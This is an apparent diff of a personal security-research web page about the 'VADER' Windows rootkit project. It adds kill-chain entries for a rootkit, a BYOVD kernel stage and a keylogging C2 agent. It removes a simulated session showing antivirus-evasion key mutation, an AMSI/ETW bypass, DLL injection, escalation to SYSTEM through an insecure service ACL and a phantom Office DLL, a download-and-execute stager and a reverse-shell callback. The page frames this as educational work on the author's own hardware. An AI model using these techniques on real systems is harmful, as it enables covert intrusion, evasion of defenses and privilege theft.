@@ -27,8 +27,6 @@
   --text-primary: #d4d4d4;
   --text-muted:   #777777;
   --text-dim:     #555555;
-  --dim:          #555555;
-  --green2:       #33cc33;
   --mono:         'Consolas', 'Cascadia Code', 'Source Code Pro', 'Courier New', monospace;
   --sans:         'Segoe UI', 'Inter', system-ui, -apple-system, sans-serif;
 }
@@ -63,79 +61,10 @@ body::after {
   z-index: 9999;
 }
 
-/* ── SITE-WIDE NAV ── */
-.site-nav {
+/* ── STICKY NAV ── */
+nav {
   position: sticky;
   top: 0;
-  background: rgba(10, 10, 10, 0.95);
-  backdrop-filter: blur(8px);
-  border-bottom: 1px solid var(--border);
-  z-index: 1001;
-  padding: 0.6rem 0;
-}
-.site-nav .inner {
-  max-width: 900px;
-  margin: 0 auto;
-  padding: 0 1.5rem;
-  display: flex;
-  gap: 1.5rem;
-  align-items: center;
-  flex-wrap: wrap;
-}
-.site-nav a {
-  color: var(--green2);
-  text-decoration: none;
-  font-size: 0.75rem;
-  letter-spacing: 0.08em;
-  transition: color 0.2s;
-}
-.site-nav a:hover { color: var(--green); text-shadow: 0 0 8px rgba(0,255,65,0.4); }
-.site-nav .brand { color: var(--green); font-weight: 600; letter-spacing: 0.12em; }
-.site-nav a.nav-red { color: var(--red); }
-.site-nav a.nav-red:hover { color: #ff6666; text-shadow: 0 0 8px rgba(255,68,68,0.4); }
-.site-nav a.nav-blue { color: #4488ff; }
-.site-nav a.nav-blue:hover { color: #6699ff; text-shadow: 0 0 8px rgba(68,136,255,0.4); }
-.site-nav a.nav-yellow { color: var(--amber); }
-.site-nav a.nav-yellow:hover { color: #ffc040; text-shadow: 0 0 8px rgba(255,176,0,0.4); }
-.site-nav a.nav-pink { color: #ff2d8a; }
-.site-nav a.nav-pink:hover { color: #ff5ca8; text-shadow: 0 0 8px rgba(255,45,138,0.4); }
-.site-nav a.nav-green { color: #00ff41; font-weight: 600; }
-.site-nav a.nav-green:hover { color: #33ff66; text-shadow: 0 0 12px rgba(0,255,65,0.6); }
-.site-nav a.nav-cyan { color: #00e5ff; }
-.site-nav a.nav-cyan:hover { color: #33eeff; text-shadow: 0 0 8px rgba(0,229,255,0.4); }
-.site-nav a.nav-purple { color: #b366ff; }
-.site-nav a.nav-purple:hover { color: #cc88ff; text-shadow: 0 0 8px rgba(179,102,255,0.4); }
-.site-nav .nav-links { display: flex; gap: 1.5rem; align-items: center; flex: 1; }
-.site-nav .hamburger {
-  display: none; background: none; border: 1px solid var(--dim);
-  color: var(--green); font-size: 1.2rem; padding: 0.2rem 0.6rem;
-  cursor: pointer; border-radius: 3px; line-height: 1;
-}
-.site-nav .hamburger:hover { background: rgba(0,255,65,0.1); }
-.site-nav .theme-btn {
-  background: none; border: 1px solid var(--dim); color: var(--amber);
-  font-size: 0.85rem; padding: 0.15rem 0.4rem; cursor: pointer;
-  border-radius: 3px; margin-left: auto;
-}
-.site-nav .theme-btn:hover { background: rgba(255,176,0,0.1); }
-
-[data-theme="light"] {
-  --bg-primary: #f5f5f0; --bg-secondary: #eaeae5; --bg-card: #e0e0db;
-  --green: #006622; --green2: #008833;
-  --amber: #cc8800; --red: #cc2222; --cyan: #0099bb;
-  --dim: #aaa; --text-primary: #333; --text-muted: #666; --text-dim: #999;
-  --border: #ccc;
-}
-[data-theme="light"] body { background: var(--bg-primary); color: var(--text-primary); }
-[data-theme="light"] body::after { display: none; }
-[data-theme="light"] .site-nav { background: rgba(245,245,240,0.95); border-bottom-color: #ccc; }
-[data-theme="light"] .section-nav { background: rgba(240,240,235,0.95); border-bottom-color: #ccc; }
-[data-theme="light"] .term, [data-theme="light"] .code-block, [data-theme="light"] pre { background: #1a1a1a; color: #ccc; }
-
-/* ── SECTION NAV ── */
-.section-nav {
-  position: sticky;
-  top: 2.5rem;
   z-index: 1000;
   background: rgba(10, 10, 10, 0.95);
   backdrop-filter: blur(12px);
@@ -143,7 +72,7 @@ body::after {
   padding: 0;
 }
 
-.section-inner {
+.nav-inner {
   max-width: 1200px;
   margin: 0 auto;
   display: flex;
@@ -153,9 +82,9 @@ body::after {
   scrollbar-width: none;
 }
 
-.section-inner::-webkit-scrollbar { display: none; }
+.nav-inner::-webkit-scrollbar { display: none; }
 
-.section-brand {
+.nav-brand {
   font-family: var(--mono);
   font-weight: 700;
   color: var(--green);
@@ -167,14 +96,14 @@ body::after {
   text-decoration: none;
 }
 
-.section-links {
+.nav-links {
   display: flex;
   gap: 0;
   list-style: none;
   overflow-x: auto;
 }
 
-.section-links a {
+.nav-links a {
   color: var(--text-muted);
   text-decoration: none;
   font-size: 0.75rem;
@@ -187,7 +116,7 @@ body::after {
   text-transform: uppercase;
 }
 
-.section-links a:hover {
+.nav-links a:hover {
   color: var(--green);
   background: rgba(0, 255, 65, 0.05);
 }
@@ -682,13 +611,9 @@ code {
   .kc-phase { grid-template-columns: 60px 1fr auto; gap: 0.5rem; padding: 0.75rem 1rem; }
   .kc-phase::before { left: 72px; }
   .hero { padding: 3rem 1.5rem 2rem; }
-  .section-nav { position: sticky; top: 0; }
-  .section-brand { padding: 0.6rem 1rem; font-size: 0.75rem; }
-  .section-links a { padding: 0.7rem 0.75rem; font-size: 0.65rem; }
-  .site-nav .hamburger { display: block; }
-  .site-nav .nav-links { display: none; flex-direction: column; width: 100%; padding: 0.5rem 0; gap: 0.5rem; align-items: flex-start; }
-  .site-nav .nav-links.show { display: flex; }
-  .site-nav .inner { flex-wrap: wrap; justify-content: space-between; }
+  nav { position: relative; }
+  .nav-brand { padding: 0.6rem 1rem; font-size: 0.75rem; }
+  .nav-links a { padding: 0.7rem 0.75rem; font-size: 0.65rem; }
 }
 
 /* ── FOOTER ── */
@@ -816,32 +741,11 @@ h3 code {
 </head>
 <body>
 
-<!-- ────────────── SITE NAV ────────────── -->
-<nav class="site-nav">
-  <div class="inner">
-    <a href="index.html" class="brand">22DIV</a>
-    <button class="hamburger" id="navToggle" aria-label="Toggle menu" aria-expanded="false">&#9776;</button>
-    <div class="nav-links" id="navLinks">
-      <a href="index.html">home</a>
-      <a href="journal.html">journal</a>
-      <a href="books.html" class="nav-red">field manual</a>
-      <a href="csec.html" class="nav-red">kill chain</a>
-      <a href="rootkit.html" class="nav-blue">rootkit manual</a>
-      <a href="networking.html" class="nav-green">networking</a>
-      <a href="fuzzer.html" class="nav-yellow">fuzzer</a>
-      <a href="report.html" class="nav-pink">book report</a>
-      <a href="defender.html" class="nav-cyan">DEFENDER</a>
-      <a href="reverseeng.html" class="nav-purple">reverse eng</a>
-      <button class="theme-btn" id="themeToggle" aria-label="Toggle theme">&#9788;</button>
-    </div>
-  </div>
-</nav>
-
-<!-- ────────────── SECTION NAV ────────────── -->
-<nav class="section-nav">
-  <div class="section-inner">
-    <a href="#top" class="section-brand">VADER // EVC</a>
-    <ul class="section-links">
+<!-- ────────────── NAV ────────────── -->
+<nav>
+  <div class="nav-inner">
+    <a href="#top" class="nav-brand">VADER // EVC</a>
+    <ul class="nav-links">
       <li><a href="#overview">Overview</a></li>
       <li><a href="#killchain">Kill Chain</a></li>
       <li><a href="#cwe732">CWE-732</a></li>
@@ -854,7 +758,9 @@ h3 code {
       <li><a href="#mutation">Mutation</a></li>
       <li><a href="#stager">Stager</a></li>
       <li><a href="#forensics">Forensics</a></li>
-      <li><a href="#session" style="color:#00ff41;">Live Session</a></li>
+      <li><a href="#cloak">Cloak</a></li>
+      <li><a href="#byovd">BYOVD</a></li>
+      <li><a href="#c2agent">C2 Agent</a></li>
     </ul>
   </div>
 </nav>
@@ -991,6 +897,33 @@ h3 code {
       <div class="kc-content">
         <div class="kc-name">Anti-Forensics (JULIET)</div>
         <div class="kc-detail">Canary wipe, log clearing, prefetch cleanup, timestomp, self-delete</div>
+      </div>
+      <span class="kc-status status-built">BUILT</span>
+    </div>
+
+    <div class="kc-phase">
+      <div class="kc-label">Phase 7</div>
+      <div class="kc-content">
+        <div class="kc-name">User-Mode Rootkit (KILO)</div>
+        <div class="kc-detail">NtQuery* inline hooks &mdash; process/file/connection hiding, system-wide CBT injection</div>
+      </div>
+      <span class="kc-status status-confirmed">OPERATIONAL</span>
+    </div>
+
+    <div class="kc-phase">
+      <div class="kc-label">Phase 8</div>
+      <div class="kc-content">
+        <div class="kc-name">BYOVD Kernel Persistence (LIMA)</div>
+        <div class="kc-detail">RTCore64.sys / dbutil_2_3.sys &mdash; token stealing, EDR callback removal, DSE bypass</div>
+      </div>
+      <span class="kc-status status-built">BUILT</span>
+    </div>
+
+    <div class="kc-phase">
+      <div class="kc-label">Phase 9</div>
+      <div class="kc-content">
+        <div class="kc-name">C2 Remote Agent (MIKE)</div>
+        <div class="kc-detail">17-op agent &mdash; VNC, screenshot, mic, keylog, SFTP, multi-method persistence</div>
       </div>
       <span class="kc-status status-built">BUILT</span>
     </div>
@@ -1964,597 +1897,232 @@ PHASE 3: VERIFY
     [SKIP] --self not specified</div>
 </section>
 
-<!-- ═══════════════════════════════════════════════════════════════ -->
-<!--  SECTION 13 — FULL KILL CHAIN SIMULATED SESSION               -->
-<!-- ═══════════════════════════════════════════════════════════════ -->
-<section id="session">
+<!-- ════════════ SECTION 13: USER-MODE ROOTKIT ════════════ -->
+<section id="cloak">
+  <div class="container">
   <div class="section-header">
     <div class="section-number">Section 13</div>
-    <h2 class="section-title">Full Kill Chain &mdash; Simulated Operational Session</h2>
+    <h2 class="section-title">User-Mode Rootkit (Phase 7 &mdash; KILO)</h2>
   </div>
 
-  <p>Reconstructed terminal output from a complete VADER kill chain execution. Every tool, every phase, every result &mdash; from mutation through anti-forensics. All output is simulated from real tested code on own hardware. No working exploit code &mdash; only the output it produces.</p>
-
-  <p style="color:var(--amber); font-size:0.8rem; margin-bottom:2rem;">CLASSIFICATION: UNCLASSIFIED // EDUCATIONAL // OWN HARDWARE ONLY</p>
-
-  <!-- ── PHASE 0: MUTATION ── -->
-  <h3 style="color:var(--amber);">Phase 0 &mdash; Mutation Pipeline</h3>
-  <p style="font-size:0.85rem; color:var(--text-muted); margin-bottom:0.5rem;">Before any operation: rotate all XOR keys. Every build gets unique signatures. Defender can&rsquo;t pattern-match what changes every time.</p>
-
-  <div class="evidence-block">C:\vader-rootkit> python mutate.py --status
-
-  ┌──────────────────────────────────────────────────────┐
-  │  CURRENT XOR KEYS                                    │
-  └──────────────────────────────────────────────────────┘
-  [*] dark_room            XOR_KEY=0x41  arrays=5   BUILT
-  [*] inject_dll           XOR_KEY=0x77  arrays=4   BUILT
-  [*] inject_exe           XOR_KEY=0x77  arrays=3   BUILT
-  [*] v4_svc_replace       V4_KEY=0x52   arrays=2   BUILT
-  [*] v5_dll_proxy         V5_KEY=0x37   arrays=3   NOT BUILT
-  [*] v6_path_hijack       V6_KEY=0x63   arrays=1   NOT BUILT
-  [*] v7_phantom_dll       V7_KEY=0x19   arrays=1   BUILT
-  [*] shell                XOR_KEY=0x41  arrays=2   BUILT</div>
-
-  <div class="evidence-block">C:\vader-rootkit> python mutate.py
-
-============================================================
-  VADER ROOTKIT — XOR Key Mutation Pipeline
-  22DIV / george wu
-  TARGET: Own hardware only
-============================================================
-
-  ┌──────────────────────────────────────────────────────┐
-  │  ROTATE — dark_room                                  │
-  └──────────────────────────────────────────────────────┘
-  [*] Attempt 1/10
-  [*] Source: dark_room_annotated.c
-  [*] Key: XOR_KEY 0x41 → 0xC7
-  [*] Arrays: 5 (xAmsiDll, xAmsiScanBuffer, xNtdll, xEtwEventWrite, xPowerShell)
-  [+] Wrote dark_room_annotated.c with key 0xC7
-  [*] Compiling dark_room_annotated.c...
-  [+] Build OK
-  [*] Scan: CLEAN
-  [+] dark_room: CLEAN at key 0xC7 (attempt 1)
-
-  ┌──────────────────────────────────────────────────────┐
-  │  ROTATE — inject_dll                                 │
-  └──────────────────────────────────────────────────────┘
-  [*] Attempt 1/10
-  [*] Source: vader_inject_dll_annotated.c
-  [*] Key: XOR_KEY 0x77 → 0x3B
-  [*] Arrays: 4 (xAmsiDll, xAmsiScanBuffer, xNtdll, xEtwEventWrite)
-  [+] Wrote vader_inject_dll_annotated.c with key 0x3B
-  [*] Compiling vader_inject_dll_annotated.c...
-  [+] Build OK
-  [*] Scan: CLEAN
-  [+] inject_dll: CLEAN at key 0x3B (attempt 1)
-
-  ┌──────────────────────────────────────────────────────┐
-  │  ROTATE — inject_exe                                 │
-  └──────────────────────────────────────────────────────┘
-  [*] Attempt 1/10
-  [*] Source: vader_inject_annotated.c
-  [*] Key: XOR_KEY 0x77 → 0xE4
-  [*] Arrays: 3 (xDllPath, xKernel32, xLoadLibraryA)
-  [+] Wrote vader_inject_annotated.c with key 0xE4
-  [*] Compiling vader_inject_annotated.c...
-  [+] Build OK
-  [*] Scan: CLEAN
-  [+] inject_exe: CLEAN at key 0xE4 (attempt 1)
-
-  ┌──────────────────────────────────────────────────────┐
-  │  ROTATE — v4_svc_replace                             │
-  └──────────────────────────────────────────────────────┘
-  [*] Attempt 1/10
-  [*] Source: svc_replace_annotated.c
-  [*] Key: V4_KEY 0x52 → 0x8D
-  [*] Arrays: 2 (xCanary, xRealBinary)
-  [+] Wrote svc_replace_annotated.c with key 0x8D
-  [*] Compiling svc_replace_annotated.c...
-  [+] Build OK
-  [*] Scan: CLEAN
-  [+] v4_svc_replace: CLEAN at key 0x8D (attempt 1)
-
-  ┌──────────────────────────────────────────────────────┐
-  │  ROTATE — v7_phantom_dll                             │
-  └──────────────────────────────────────────────────────┘
-  [*] Attempt 1/10
-  [*] Source: phantom_dll_annotated.c
-  [*] Key: V7_KEY 0x19 → 0xAE
-  [*] Arrays: 1 (xCanary)
-  [+] Wrote phantom_dll_annotated.c with key 0xAE
-  [*] Compiling phantom_dll_annotated.c...
-  [+] Build OK
-  [*] Scan: CLEAN
-  [+] v7_phantom_dll: CLEAN at key 0xAE (attempt 1)
-
-  ┌──────────────────────────────────────────────────────┐
-  │  ROTATE — shell                                      │
-  └──────────────────────────────────────────────────────┘
-  [*] Attempt 1/10
-  [*] Source: vader_shell_annotated.c
-  [*] Key: XOR_KEY 0x41 → 0x59
-  [*] Arrays: 2 (xCmd, xWs2)
-  [+] Wrote vader_shell_annotated.c with key 0x59
-  [*] Compiling vader_shell_annotated.c...
-  [+] Build OK
-  [*] Scan: CLEAN
-  [+] shell: CLEAN at key 0x59 (attempt 1)
-
-  ┌──────────────────────────────────────────────────────┐
-  │  SUMMARY                                             │
-  └──────────────────────────────────────────────────────┘
-  [+] dark_room            OK
-  [+] inject_dll           OK
-  [+] inject_exe           OK
-  [+] v4_svc_replace       OK
-  [+] v5_dll_proxy         SKIP (not built)
-  [+] v6_path_hijack       SKIP (not built)
-  [+] v7_phantom_dll       OK
-  [+] shell                OK
-
-  6/8 components rotated successfully (2 skipped)</div>
-
-  <!-- ── PHASE 1: C2 INFRASTRUCTURE ── -->
-  <h3 style="color:var(--amber);">Phase 1 &mdash; C2 Infrastructure Setup</h3>
-  <p style="font-size:0.85rem; color:var(--text-muted); margin-bottom:0.5rem;">Payload server and listener go up first. Two terminals. Server hosts the binaries, listener catches the callback.</p>
-
-  <div class="evidence-block" style="border-left-color:var(--cyan);">C:\vader-rootkit> python stagers\vader_serve.py 8080
-
-  +======================================================+
-  |  VADER PAYLOAD SERVER — 22DIV / george wu             |
-  |  Callsign: INDIA (serves HTTP stager)                 |
-  +======================================================+
-  |  Port:     8080                                        |
-  |  Root:     C:\Users\gwu07\Desktop\vader-rootkit        |
-  +======================================================+
-
-  Available payloads:
-
-    GET /dark_room       -> dark_room/dark_room.exe          [READY (46.0 KB)]
-    GET /inject_dll      -> injection/vader_inject.dll       [READY (38.0 KB)]
-    GET /inject_exe      -> injection/vader_inject.exe       [READY (43.0 KB)]
-    GET /shell           -> shell/vader_shell.exe            [READY (41.5 KB)]
-
-  [*] Listening on 0.0.0.0:8080
-  [*] Stager command: vader_stager.exe
-  [*] Press Ctrl+C to stop</div>
-
-  <div class="evidence-block" style="border-left-color:var(--cyan);">C:\vader-rootkit> python shell\vader_listener.py 4444
-
-  ╔══════════════════════════════════════════════════════╗
-  ║  VADER LISTENER                                     ║
-  ║  C2 listener + payload auto-configurator            ║
-  ╚══════════════════════════════════════════════════════╝
-
-  [*] Detected network interfaces:
-      {1} 192.168.1.100        (Primary LAN) ◄
-      {2} 0.0.0.0              (All interfaces)
-      {3} 127.0.0.1            (Loopback only)
-
-  [?] Select interface [{1}]: 1
-  [*] Port: 4444 (from argv)
-
-  [*] C2 Configuration:
-      Listen IP:   192.168.1.100
-      Display IP:  192.168.1.100
-      Port:        4444
-
-  [*] Listening on 192.168.1.100:4444...
-  [*] Run on target:  vader_shell.exe 192.168.1.100 4444
-  [*] Waiting for VADER callback...</div>
-
-  <!-- ── PHASE 2: DARK ROOM ── -->
-  <h3 style="color:var(--amber);">Phase 2 &mdash; Dark Room Activation</h3>
-  <p style="font-size:0.85rem; color:var(--text-muted); margin-bottom:0.5rem;">Combined AMSI + ETW bypass. Hardware breakpoints on DR0 and DR1. Zero memory modification. Defender cannot detect what doesn&rsquo;t modify memory.</p>
-
-  <div class="evidence-block">C:\vader-rootkit> dark_room\dark_room.exe --test
-
-  +======================================================+
-  |  VADER DARK ROOM — 22DIV / george wu                 |
-  |  AMSI + ETW Bypass (Dual Hardware Breakpoint)         |
-  +======================================================+
-  |  DR0: AmsiScanBuffer → E_INVALIDARG                   |
-  |  DR1: EtwEventWrite  → STATUS_SUCCESS                 |
-  |  Memory modified: ZERO bytes                          |
-  |  VirtualProtect: NOT CALLED                           |
-  |  Privilege: Standard user                              |
-  +======================================================+
-
-  --- PHASE 1: LOCATE TARGETS ---
-
-  [+] AmsiScanBuffer at 0x00007FFE8A3C1020
-  [+] EtwEventWrite  at 0x00007FFE8B4D2340
-
-  --- PHASE 2: ACTIVATE DARK ROOM ---
-
-  [+] Unified VEH handler registered
-  [+] DR0 = 0x00007FFE8A3C1020 (AmsiScanBuffer)
-  [+] DR1 = 0x00007FFE8B4D2340 (EtwEventWrite)
-  [+] DR7 = 0x5
-
-  [+] DARK ROOM ACTIVE
-  [+] Script scanning: BLIND (AMSI)
-  [+] Process telemetry: BLIND (ETW)
-  [+] Memory integrity: CLEAN (zero modifications)
-
-  --- PHASE 3: VERIFY ---
-
-  [*] Testing AMSI bypass...
-  [+] AMSI: returned 0x80070057 (E_INVALIDARG) — BLIND
-  [*] Testing ETW bypass...
-  [+] ETW:  returned 0 (STATUS_SUCCESS) — BLIND
-
-  [+] DARK ROOM VERIFIED — ALL SYSTEMS BLIND
-
-  [*] --test mode: verification complete.
-
-  +======================================================+
-  |  EVIDENCE SUMMARY — COMBINED BYPASS                   |
-  +======================================================+
-  |  Target 1:    AmsiScanBuffer (amsi.dll)  via DR0     |
-  |  Target 2:    EtwEventWrite  (ntdll.dll) via DR1     |
-  |  Technique:   Dual hardware execution breakpoints     |
-  |  Intercept:   Unified VEH handler                     |
-  |  AMSI result: E_INVALIDARG (0x80070057) — scan blind |
-  |  ETW result:  STATUS_SUCCESS (0x00000000) — telemetry |
-  |               silenced, dead man test passed          |
-  |  Memory mod:  0 bytes (amsi.dll + ntdll.dll intact)  |
-  |  VProtect:    NOT CALLED                              |
-  |  Privilege:   Standard user (own thread context)      |
-  |  Tamper Prot: DID NOT DETECT                          |
-  +======================================================+
-  |  Verify: Get-MpThreatDetection | Where-Object {      |
-  |    $_.Resources -match 'dark_room' }                  |
-  |  Expected: No results (bypass invisible to Defender)  |
-  +======================================================+</div>
-
-  <!-- ── PHASE 3: PROCESS INJECTION ── -->
-  <h3 style="color:var(--amber);">Phase 3 &mdash; Process Injection (HOTEL)</h3>
-  <p style="font-size:0.85rem; color:var(--text-muted); margin-bottom:0.5rem;">DLL injection into a suspended process. The injected DLL arms HWBP on all threads plus a watchdog that re-enumerates. Target process is AMSI+ETW blind before any script executes.</p>
-
-  <div class="evidence-block">C:\vader-rootkit> injection\vader_inject.exe --spawn
-
-  +======================================================+
-  |  VADER INJECT — 22DIV / george wu                    |
-  |  Phase 4: DLL Injection + HWBP (HOTEL)               |
-  +======================================================+
-  |  Mode 1: vader_inject.exe &lt;PID&gt;                      |
-  |  Mode 2: vader_inject.exe --spawn                    |
-  +======================================================+
-
-  [+] DLL: C:\Users\gwu07\vader-rootkit\injection\vader_inject.dll
-
-  --- MODE: CREATE_SUSPENDED INJECTION ---
-
-  [*] Spawning suspended process...
-  [+] Spawned PID 18240 (suspended)
-  [+] Main thread ID: 18244 (suspend count: 1)
-
-  --- INJECTING INTO SUSPENDED PROCESS ---
-
-  [*] Allocating 62 bytes in target...
-  [+] Remote buffer at 0x000001E8A4F20000
-  [+] Wrote 62 bytes (DLL path)
-  [*] Starting LoadLibraryA thread in target...
-  [+] Injection thread started
-  [*] Waiting for DLL load...
-  [+] DLL loaded at 0x00007FFE12340000 in target
-  [+] VdrWatch offset: 0x1A30
-  [+] Remote VdrWatch: 0x00007FFE1234BA30
-  [*] Starting VdrWatch thread...
-  [+] VdrWatch started — periodic thread re-enumeration active
-
-  [*] Resuming main thread...
-  [+] Resumed (prev suspend count: 1)
-
-  +======================================================+
-  |  INJECTION COMPLETE — PID 18240                       |
-  +======================================================+
-  |  AMSI:     BLIND (DR0 on AmsiScanBuffer)             |
-  |  ETW:      BLIND (DR1 on EtwEventWrite)              |
-  |  Watchdog: VdrWatch active (2s re-enum)              |
-  |  Memory:   0 bytes modified                          |
-  +======================================================+
-  |  Test: 'AMSI Test Sample: 7e72c3ce-861b-4339'       |
-  |  Expected: no detection (AMSI blind)                 |
-  +======================================================+
-
-  -- VADER INJECT COMPLETE --</div>
-
-  <p style="font-size:0.85rem; color:var(--text-muted); margin-bottom:0.5rem;">PID attach mode &mdash; inject into an already-running process:</p>
-
-  <div class="evidence-block">C:\vader-rootkit> injection\vader_inject.exe 14832
-
-  +======================================================+
-  |  VADER INJECT — 22DIV / george wu                    |
-  |  Phase 4: DLL Injection + HWBP (HOTEL)               |
-  +======================================================+
-  |  Mode 1: vader_inject.exe &lt;PID&gt;                      |
-  |  Mode 2: vader_inject.exe --spawn                    |
-  +======================================================+
-
-  [+] DLL: C:\Users\gwu07\vader-rootkit\injection\vader_inject.dll
-
-  --- MODE: PID INJECTION (target: 14832) ---
-
-  [+] Opened process 14832
-
-  --- INJECTING INTO RUNNING PROCESS ---
-
-  [*] Allocating 62 bytes in target...
-  [+] Remote buffer at 0x0000023FA1B80000
-  [+] Wrote 62 bytes (DLL path)
-  [*] Starting LoadLibraryA thread in target...
-  [+] Injection thread started
-  [*] Waiting for DLL load...
-  [+] DLL loaded at 0x00007FFE56780000 in target
-  [+] VdrWatch offset: 0x1A30
-  [+] Remote VdrWatch: 0x00007FFE56781A30
-  [*] Starting VdrWatch thread...
-  [+] VdrWatch started — periodic thread re-enumeration active
-
-  +======================================================+
-  |  INJECTION COMPLETE — PID 14832                       |
-  +======================================================+
-  |  AMSI:     BLIND (DR0 on AmsiScanBuffer)             |
-  |  ETW:      BLIND (DR1 on EtwEventWrite)              |
-  |  Watchdog: VdrWatch active (2s re-enum)              |
-  |  Memory:   0 bytes modified                          |
-  +======================================================+
-
-  -- VADER INJECT COMPLETE --</div>
-
-  <p style="font-size:0.85rem; color:var(--text-muted); margin-bottom:0.5rem;">Injected DLL canary output &mdash; written to disk by the DLL inside the target process:</p>
-
-  <div class="evidence-block" style="border-left-color:var(--amber);">C:\vader-rootkit> type C:\Windows\Temp\inject_status.log
-
-[HOTEL] loaded - HWBP armed
-[HOTEL] watchdog started
-[HOTEL] watchdog alive</div>
-
-  <!-- ── PHASE 4: PRIVILEGE ESCALATION ── -->
-  <h3 style="color:var(--amber);">Phase 4 &mdash; Privilege Escalation (V4 DELTA + V7 GOLF)</h3>
-  <p style="font-size:0.85rem; color:var(--text-muted); margin-bottom:0.5rem;">Two independent paths to SYSTEM. V4 replaces a service binary with insecure ACLs. V7 plants a phantom DLL that doesn&rsquo;t exist anywhere on disk &mdash; ClickToRunSvc fills the void from a user-writable PATH directory. Both fire on reboot or service restart. No UAC prompt. No admin credentials.</p>
-
-  <p style="font-size:0.85rem; color:var(--text-muted); margin-bottom:0.5rem;">V4 DELTA &mdash; service binary replacement canary (CWE-732):</p>
-
-  <div class="evidence-block" style="border-left-color:var(--red);">C:\vader-rootkit> type C:\Windows\Temp\svc_health.log
-
-20260618_143025|SYSTEM|elev=1|pid=4832|DELTA_REPLACE
-               ^^^^^^ ^^^^^^
-               SYSTEM  ELEVATED — Full SYSTEM token, not filtered
-               No admin credentials entered. No UAC prompt triggered.
-               Standard user → SYSTEM via insecure service binary ACLs.</div>
-
-  <p style="font-size:0.85rem; color:var(--text-muted); margin-bottom:0.5rem;">V7 GOLF &mdash; phantom DLL canary (CWE-427). First-party Microsoft service, first-party OS search order:</p>
-
-  <div class="evidence-block" style="border-left-color:var(--red);">C:\vader-rootkit> type C:\Windows\Temp\osp_telemetry.log
-
-20260618_143512|SYSTEM|elev=1|pid=6240|PHANTOM_OSPPC|C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe
-               ^^^^^^ ^^^^^^                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-               SYSTEM  ELEVATED                      First-party Microsoft service loaded our DLL
-               osppc.dll does NOT EXIST on disk — the service delay-loads it.
-               User-writable PATH directory fills the void.
-               Standard user → SYSTEM. No UAC. No admin. No exploit.</div>
-
-  <!-- ── PHASE 5: HTTP STAGER ── -->
-  <h3 style="color:var(--amber);">Phase 5 &mdash; HTTP Stager (INDIA)</h3>
-  <p style="font-size:0.85rem; color:var(--text-muted); margin-bottom:0.5rem;">WinHTTP dropper. Downloads payloads from the C2 server, decrypts, and executes in memory. XOR key 0x88. Self-cleans after execution.</p>
-
-  <div class="evidence-block">C:\vader-rootkit> stagers\vader_stager.exe --inject
-
-  +======================================================+
-  |  VADER HTTP STAGER — 22DIV / george wu               |
-  |  Callsign: INDIA                                      |
-  +======================================================+
-  |  C2:     127.0.0.1:8080                              |
-  |  Target: %TEMP%\vader_payload.exe                    |
-  |  Mode:   LIVE + INJECT                               |
-  +======================================================+
-
-  --- PHASE 1: RESOLVE PATHS ---
-
-  [+] Primary target: C:\Users\gwu07\AppData\Local\Temp\vader_payload.exe
-  [+] Inject DLL:     C:\Users\gwu07\AppData\Local\Temp\vader_inject.dll
-  [+] Inject EXE:     C:\Users\gwu07\AppData\Local\Temp\vader_inject.exe
-
-  --- PHASE 2: DOWNLOAD PAYLOADS ---
-
-  [*] Contacting C2 at 127.0.0.1:8080...
-  [+] Downloaded 47104 bytes → vader_payload.exe
-  [+] Downloaded 38912 bytes → vader_inject.dll
-  [+] Downloaded 44032 bytes → vader_inject.exe
-
-  --- PHASE 3: EXECUTE ---
-
-  [+] Executed: vader_payload.exe (PID 19204)
-  [+] Executed: vader_inject.exe --spawn (PID 19208)
-
-  --- PHASE 4: EVIDENCE ---
-
-  [+] Canary written: C:\Windows\Temp\vader_stager_canary.txt
-
-  --- PHASE 5: CLEANUP ---
-
-  [*] Cleaned up: vader_payload.exe
-  [*] Cleanup skipped (file in use): vader_inject.dll
-  [*] Cleanup skipped (file in use): vader_inject.exe
-
-  +======================================================+
-  |  STAGER COMPLETE — INDIA OUT                          |
-  +======================================================+</div>
-
-  <p style="font-size:0.85rem; color:var(--text-muted); margin-bottom:0.5rem;">Meanwhile on the payload server &mdash; request log shows every download:</p>
-
-  <div class="evidence-block" style="border-left-color:var(--cyan);">  --- REQUEST LOG ---
-
-  [2026-06-18 14:30:12] 127.0.0.1:49201 -> GET /dark_room   -> 200 OK (46.0 KB)
-  [2026-06-18 14:30:13] 127.0.0.1:49202 -> GET /inject_dll  -> 200 OK (38.0 KB)
-  [2026-06-18 14:30:13] 127.0.0.1:49203 -> GET /inject_exe  -> 200 OK (43.0 KB)
-  [2026-06-18 14:30:14] 127.0.0.1:49204 -> GET /shell       -> 200 OK (41.5 KB)</div>
-
-  <!-- ── PHASE 6: C2 CALLBACK ── -->
-  <h3 style="color:var(--amber);">Phase 6 &mdash; C2 Callback</h3>
-  <p style="font-size:0.85rem; color:var(--text-muted); margin-bottom:0.5rem;">VADER shell calls back to the listener. SYSTEM context after privilege escalation. The listener receives the banner and drops into an interactive shell.</p>
-
-  <div class="evidence-block" style="border-left-color:#00ff88;">  [+] Connection from 192.168.1.100:49832
-  [+] VADER shell active — Ctrl+C to disconnect
-
-  ██████╗ ██████╗ ██████╗ ██╗██╗   ██╗
-  ╚════██╗╚════██╗██╔══██╗██║██║   ██║
-   █████╔╝ █████╔╝██║  ██║██║██║   ██║
-  ██╔═══╝ ██╔═══╝ ██║  ██║██║╚██╗ ██╔╝
-  ███████╗███████╗██████╔╝██║ ╚████╔╝
-  ╚══════╝╚══════╝╚═════╝ ╚═╝  ╚═══╝
-              V A D E R
-           george wu / 22div
-     shadow shell - system context active
-
-  C:\Windows\system32> whoami
-  nt authority\system
-
-  C:\Windows\system32> whoami /priv
-  PRIVILEGES INFORMATION
-  ----------------------
-  Privilege Name                  Description                    State
-  =============================== ============================= ========
-  SeAssignPrimaryTokenPrivilege   Replace a process level token  Enabled
-  SeTcbPrivilege                  Act as part of the OS          Enabled
-  SeSecurityPrivilege             Manage auditing and security   Enabled
-  SeTakeOwnershipPrivilege        Take ownership of files        Enabled
-  SeLoadDriverPrivilege           Load and unload device drivers Enabled
-  SeBackupPrivilege               Back up files and directories  Enabled
-  SeRestorePrivilege              Restore files and directories  Enabled
-  SeDebugPrivilege                Debug programs                 Enabled
-  SeImpersonatePrivilege          Impersonate a client           Enabled
-
-  C:\Windows\system32></div>
-
-  <!-- ── PHASE 7: ANTI-FORENSICS ── -->
